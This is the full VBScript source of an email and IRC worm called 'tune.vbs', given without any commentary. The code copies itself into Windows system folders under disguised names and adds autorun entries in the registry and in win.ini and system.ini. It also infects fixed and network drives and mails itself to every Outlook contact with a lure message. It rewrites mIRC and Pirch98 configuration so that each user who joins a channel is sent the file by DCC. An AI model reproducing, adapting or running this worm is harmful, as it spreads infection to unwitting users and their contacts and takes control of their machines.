sub Tune() 
On Error Resume Next 
Dim obj, sysfldr,s, f 
Set obj = CreateObject("Scripting.FileSystemObject") 
Set sysfldr = obj.GetSpecialFolder(1) 
Set winfldr = obj.GetSpecialFolder(0) 
Set tmpfldr = obj.GetSpecialFolder(2) 
set s = CreateObject("Scripting.FileSystemObject") 
Set f = s.GetFile(WScript.ScriptFullName) 
f.copy(sysfldr&"\tune.vbs") 
f.copy(winfldr&"\tune.vbs") 
f.copy(tmpfldr&"\tune.vbs") 
f.copy(sysfldr&"\kernel.vbs") 
f.copy(winfldr&"\winsck.vbs") 
f.copy(sysfldr&"\explorer.vbs") 
loc=winfldr&"\tune.vbs" 
loc1=sysfldr&"\tune.vbs" 
loc2=tmpfldr&"\tune.vbs" 
loc3=sysfldr&"\kernel.vbs" 
loc4=winfldr&"\winsck.vbs" 
loc5="explorer.vbs" 
Set WSHShell = CreateObject("WScript.Shell") 
WSHShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ScanRegistry", loc 
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\", loc1 
WSHShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", loc2 
editini winfldr&"\win.ini","[windows]","load",loc3 
editini winfldr&"\win.ini","[windows]","run",loc4 
editini winfldr&"\system.ini","[boot]","shell","Explorer.exe " & loc5 
ntwrk() 
end sub 
sub infect(drive) 
On Error Resume Next 
set s = CreateObject("Scripting.FileSystemObject") 
Set f = s.GetFile(WScript.ScriptFullName) 
f.copy(drive & "\tune.vbs") 
path=drive&"\tune.vbs" 
end sub 
Function ShowDriveType(drvpath) 
On Error Resume Next 
Dim fso, d, t 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set d = fso.GetDrive(drvpath) 
Select Case d.DriveType 
Case 0: t = "Unknown" 
Case 1: t = "Removable" 
Case 2: t = "Fixed" 
Case 3: t = "Network" 
Case 4: t = "CD-ROM" 
Case 5: t = "RAM Disk" 
End Select 
if t = "" then t = "None" 
ShowDriveType = t 
End Function 
sub ntwrk() 
On Error Resume Next 
for n = 65 to 90 
l=Chr(n) 
drv=l&":" 
d3=ShowDriveType(drv) 
if d3 = "Fixed" then infect(drv) 
if d3 = "Network" then infect(drv) 
next 
sprd() 
end sub 
sub sprd() 
on error resume next 
Dim oShell 
Set oShell = Wscript.CreateObject("Wscript.Shell") 
Dim strProfile 
Dim strAlias, strAliasKey 
strProfile = 
oShell.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?") 
if strProfile = "" then 
oShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Sent?", "1" 
Set Prg = CreateObject("Outlook.Application") 
Set Prg1 = Prg.GetNameSpace("MAPI") 
For y = 1 To Prg1.AddressLists.Count 
Set AdBook = Prg1.AddressLists(y) 
x = 1 
Set Maie = Prg.CreateItem(0) 
For oo = 1 To AdBook.AddressEntries.Count 
newmailadd = AdBook.AddressEntries(x) 
Maie.Recipients.Add newmailadd 
x = x + 1 
Next 
Maie.Subject = "Please Read" 
Maie.Body = "Hey, you really need to check out this attached file I sent you...please check it out as soon as possible." 
Maie.Attachments.Add WScript.ScriptFullName 
Maie.DeleteAfterSubmit = False 
Maie.Send 
newmailadd="" 
next 
else 
end if 
etc() 
end sub 
sub etc() 
On Error Resume Next 
a=ReportFolderStatus("C:\mirc") 
if a="1" then mirc() 
b=ReportFolderStatus("C:\pirch98") 
if b="1" then pirch9x() 
end sub 
Tune() 
Function ReportFileStatus(filespec) 
On Error Resume Next 
Dim fso, msg 
Set fso = CreateObject("Scripting.FileSystemObject") 
If (fso.FileExists(filespec)) Then 
msg = "1" 
Else 
msg = "0" 
End If 
ReportFileStatus = msg 
End Function 
Function ReportFolderStatus(fldr) 
On Error Resume Next 
Dim fso, msg 
Set fso = CreateObject("Scripting.FileSystemObject") 
If (fso.FolderExists(fldr)) Then 
msg = "1" 
Else 
msg = "0" 
End If 
ReportFolderStatus = msg 
End Function 
sub mirc() 
On Error Resume Next 
Dim fso4, folder 
Set fso4 = CreateObject("Scripting.FileSystemObject") 
Set winfolder = fso4.GetSpecialFolder(1) 
path = winfolder&"\tune.vbs" 
Dim fso34, f132, t2s 
Const ForWriting = 2 
Set fso34 = CreateObject("Scripting.FileSystemObject") 
fso34.CreateTextFile ("c:\mirc\script.ini") 
Set f132 = fso34.GetFile("c:\mirc\script.ini") 
Set t2s = f132.OpenAsTextStream(ForWriting, false) 
t2s.write "[script]" & vbcrlf 
t2s.write "n0=ON 1:JOIN:#:/dcc send $nick " & path & vbcrlf 
t2s.close 
editini 
"C:\mirc\mirc.ini","[text]","ignore","*.exe,*.com,*.bat,*.dll,*.ini,*.vbs" 
editini 
"C:\mirc\mirc.ini","[options]","n2","0,1,0,0,1,1,1,1,0,5,35,0,0,1,1,0,1,1,0, 
5,500,10,0,1,1,0,0" 
editini 
"C:\mirc\mirc.ini","[options]","n4","1,0,1,1,0,3,9999,0,0,0,1,0,1024,0,0,99, 
60,0,0,1,1,1,0,1,1,5000,1" 
end sub 
sub pirch9x() 
On Error Resume Next 
Dim fso4, folder 
Set fso4 = CreateObject("Scripting.FileSystemObject") 
Set winfolder = fso4.GetSpecialFolder(1) 
path = winfolder&"\tune.vbs" 
Dim fso, f1, ts 
Const ForWriting = 2 
Set fso = CreateObject("Scripting.FileSystemObject") 
fso.CreateTextFile ("c:\pirch98\events.ini") 
Set f1 = fso.GetFile("c:\pirch98\events.ini") 
Set ts = f1.OpenAsTextStream(ForWriting, false) 
ts.write "[Levels]"&vbcrlf 
ts.write "Enabled=1"&vbcrlf 
ts.write "Count=6"&vbcrlf 
ts.write "Level1=000-Unknowns"&vbcrlf 
ts.write "000-UnknownsEnabled=1"&vbcrlf 
ts.write "Level2=100-Level 100"&vbcrlf 
ts.write "100-Level 100Enabled=1"&vbcrlf 
ts.write "Level3=200-Level 200"&vbcrlf 
ts.write "200-Level 200Enabled=1"&vbcrlf 
ts.write "Level4=300-Level 300"&vbcrlf 
ts.write "300-Level 300Enabled=1"&vbcrlf 
ts.write "Level5=400-Level 400"&vbcrlf 
ts.write "400-Level 400Enabled=1"&vbcrlf 
ts.write "Level6=500-Level 500"&vbcrlf 
ts.write "500-Level 500Enabled=1"&vbcrlf 
ts.write vbcrlf 
ts.write "[000-Unknowns]"&vbcrlf 
ts.write "User1=*!*@*"&vbcrlf 
ts.write "UserCount=1"&vbcrlf 
ts.write "Event1=ON JOIN:#:/msg $nick Hi there"&vbcrlf 
ts.write "EventCount=1"&vbcrlf 
ts.write vbcrlf 
ts.write "[100-Level 100]"&vbcrlf 
ts.write "User1=*!*@*"&vbcrlf 
ts.write "UserCount=1"&vbcrlf 
ts.write "Event1=ON JOIN:#:/dcc send $nick " & path &vbcrlf 
ts.write "EventCount=1"&vbcrlf 
ts.write vbcrlf 
ts.write "[200-Level 200]"&vbcrlf 
ts.write "UserCount=0"&vbcrlf 
ts.write "EventCount=0"&vbcrlf 
ts.write vbcrlf 
ts.write "[300-Level 300]"&vbcrlf 
ts.write "UserCount=0"&vbcrlf 
ts.write "EventCount=0"&vbcrlf 
ts.write vbcrlf 
ts.write "[400-Level 400]"&vbcrlf 
ts.write "UserCount=0"&vbcrlf 
ts.write "EventCount=0"&vbcrlf 
ts.write vbcrlf 
ts.write "[500-Level 500]"&vbcrlf 
ts.write "UserCount=0"&vbcrlf 
ts.write "EventCount=0"&vbcrlf 
ts.write vbcrlf 
editini "C:\pirch98\pirch98.ini","[DCC]","AutoHideDccWin","1" 
end sub 
sub editini(filename,section,string,newvalue) 
on error resume next 
Const ForReading = 1 
Const ForWriting = 2 
iniFile = filename 
sectionName = section 
keyName = string 
newVlaue = newvalue 
bInSection = false 
bKeyChanged = false 
Set fso = CreateObject("Scripting.FileSystemObject") 
Set ts = fso.OpenTextFile(iniFile, ForReading) 
lines = Split(ts.ReadAll,vbCrLf) 
ts.close 
For n = 0 to ubound(lines) 
if left(lines(n),1) = "[" then 
if bInSection then 
exit for 
end if 
if instr(lines(n),sectionName) = 1 then 
bInSection = true 
else 
bInSection = false 
end if 
else 
if bInSection then 
if instr(lines(n),keyName & "=") = 1 then 
bKeyChanged = true 
lines(n) = keyName & "=" & newVlaue 
bKeyChanged = true 
exit for 
end if 
end if 
end if 
Next 
if bKeyChanged then 
Set ts = fso.OpenTextFile(iniFile, ForWriting) 
ts.Write join(lines,vbCrLf) 
ts.close 
end if 
set ts = nothing 
set fso = nothing 
end sub 
